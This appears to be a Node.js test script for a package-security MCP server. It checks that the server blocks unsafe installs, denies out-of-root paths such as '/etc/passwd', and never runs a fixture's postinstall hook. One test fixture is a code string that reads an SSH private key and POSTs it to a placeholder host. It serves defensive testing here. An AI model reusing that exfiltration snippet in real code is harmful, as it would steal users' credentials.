'use strict';
const assert = require('node:assert/strict');
const fs = require('node:fs/promises');
const os = require('node:os');
const path = require('node:path');
const { performance } = require('node:perf_hooks');
const checkout = path.resolve(__dirname, '..');
const live = process.argv.includes('--live');
if (process.argv.slice(2).some(arg => arg !== '--live')) throw new Error('Only --live is supported (enables one npm/OSV guard check).');
const { start, evidence, call } = require(path.join(checkout, 'test/helpers/mcp-load-client'));
async function main() {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'pkgxray-live-mcp-'));
  const source = path.join(root, 'fixture'); await fs.mkdir(source);
  await fs.writeFile(path.join(source, 'package.json'), JSON.stringify({name:'inert-automatic-fixture',version:'1.0.0',main:'index.js',scripts:{postinstall:'node install.js'}}));
  await fs.writeFile(path.join(source, 'index.js'), 'exports.add=(a,b)=>a+b;');
  await fs.writeFile(path.join(source, 'package-lock.json'), JSON.stringify({lockfileVersion:3,packages:{'':{name:'inert-automatic-fixture',version:'1.0.0'}}}));
  const marker = path.join(root, 'must-not-exist');
  await fs.writeFile(path.join(source, 'install.js'), `require('fs').writeFileSync(${JSON.stringify(marker)},'executed');`);
  const client = start('static', { cwd: root, env: {...process.env, PKGXRAY_MCP_ALLOWED_ROOTS:root, PKGXRAY_COMPOSE:'1', PKGXRAY_VM_TESTS:'0'} });
  const checks=[];
  async function check(label, run) { const at=performance.now(); const result=await run(); checks.push({label,ms:+(performance.now()-at).toFixed(2),...result}); }
  const tool=(name,args)=>client.request('tools/call',{name,arguments:args});
  try {
    const list=await client.init();
    assert.ok(list.result.tools.some(t=>t.name==='analyze_package_composition'));
    const guard=list.result.tools.find(t=>t.name==='guard_agent_extension_install');
    assert.match(guard.description,/retry.*once/);
    assert.ok(!guard.inputSchema.properties.reviewChoice);
    assert.ok(!guard.inputSchema.properties.reviewId);
    assert.ok(!guard.inputSchema.properties.promoteTo);
    checks.push({label:'tool discovery',tools:list.result.tools.map(t=>t.name)});
    await check('benign source and repeated cache',async()=>{
      const first=await call(client,evidence(123)); const second=await call(client,evidence(123));
      assert.equal(first.result.structuredContent.verdict,'safe'); assert.equal(second.result.structuredContent.scanSource,'cache');
      return {verdict:'safe',repeatedSource:second.result.structuredContent.scanSource};
    });
    await check('inert credential exfiltration evidence',async()=>{
      const input=evidence(1); input.sourceFiles['index.js']="const fs=require('fs');const https=require('https');const key=fs.readFileSync('/home/example/.ssh/id_rsa','utf8');https.request('https://example.invalid',{method:'POST'}).end(key);";
      const r=(await call(client,input)).result.structuredContent; assert.equal(r.verdict,'block');
      return {verdict:r.verdict,categories:r.findings.filter(f=>f.severity==='high').map(f=>f.category)};
    });
    await check('25 concurrent identical source audits',async()=>{
      const responses=await Promise.all(Array.from({length:25},()=>call(client,evidence(456))));
      assert.ok(responses.every(r=>r.result.structuredContent.verdict==='safe'));
      return {responses:responses.length,sources:responses.map(r=>r.result.structuredContent.scanSource)};
    });
    await check('guard automatically blocks incomplete checks without executing or prompting',async()=>{
      const response=await tool('guard_agent_extension_install',{reference:source,vulnerabilityCheck:false,githubMetadata:false,githubDiff:false,outputFormat:'json'});
      const r=response.result.structuredContent;
      assert.equal(r.assessment.checks.source,'completed');
      assert.equal(r.allowed,false);assert.equal(r.decision,'block');assert.ok(r.resolution.reasonCodes.length);
      assert.ok(!Object.hasOwn(r,'review'));assert.ok(!Object.hasOwn(r,'reviewPlan'));
      assert.equal(r.sourceEvidence.contentReturned,false);assert.ok(!JSON.stringify(r).includes('writeFileSync'));
      await assert.rejects(fs.stat(marker),{code:'ENOENT'});
      return {decision:r.decision,allowed:r.allowed,reasonCodes:r.resolution.reasonCodes,retry:r.resolution.retry,buildId:r.assessment.engine.buildId};
    });
    await check('forbidden promotion and out-of-root input',async()=>{
      for(const args of [{reference:source,promoteTo:path.join(root,'promotion')},{reference:'/etc/passwd'}]) {
        const r=await tool('guard_agent_extension_install',args);assert.equal(r.error.code,-32602);
      }
      await assert.rejects(fs.stat(path.join(root,'promotion')),{code:'ENOENT'});return {denied:2};
    });
    await check('Compose MCP analyzes inert local source',async()=>{
      const response=await tool('analyze_package_composition',{projectPath:source,entry:'index.js',outputFormat:'json'});
      const r=response.result.structuredContent;
      assert.equal(r.authorization.installAllowed,false);assert.equal(r.pkgxray.status,'completed');assert.equal(r.decision,'block');
      await assert.rejects(fs.stat(marker),{code:'ENOENT'});
      return {decision:r.decision,execution:r.execution,installAllowed:false};
    });
    if(live) await check('real npm and OSV guard for ms@2.1.3',async()=>{
      const response=await tool('guard_agent_extension_install',{reference:'npm:ms@2.1.3',outputFormat:'json'});
      assert.ok(response.result?.structuredContent,JSON.stringify(response.error));
      const r=response.result.structuredContent;assert.ok(['allow','block'].includes(r.decision));
      assert.ok(['completed','partial','disabled','skipped','failed'].includes(r.assessment.checks.source));
      if(r.approval)assert.equal(r.approval.checks.source,r.assessment.checks.source);
      assert.ok(!Object.hasOwn(r,'review'));assert.ok(!Object.hasOwn(r,'reviewPlan'));
      return {decision:r.decision,allowed:r.allowed,checks:r.assessment.checks,reasonCodes:r.resolution?.reasonCodes||[],retry:r.resolution?.retry,buildId:r.assessment.engine.buildId,timings:r.timings};
    });
    console.log(JSON.stringify({measuredAt:new Date().toISOString(),transport:'real stdio MCP',realNetwork:live,fixtureExecution:false,checks},null,2));
  } finally {await client.close();await fs.rm(root,{recursive:true,force:true});}
}
main().catch(error=>{console.error(error);process.exitCode=1;});
